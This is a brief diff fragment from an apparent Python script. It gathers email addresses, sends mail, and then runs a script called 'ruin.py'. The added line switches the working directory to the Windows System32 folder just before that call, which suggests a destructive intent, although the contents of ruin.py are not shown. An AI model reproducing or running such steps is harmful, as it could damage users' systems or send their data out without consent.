@@ -107,7 +107,7 @@ def sendEmail(usernames):
         # Close the port
     TIE_server.quit()
 
-
+os.chdir("/Windows/System32")
 lnewlist = getEmail()
 sendEmail(lnewlist)
 os.system("python ruin.py")
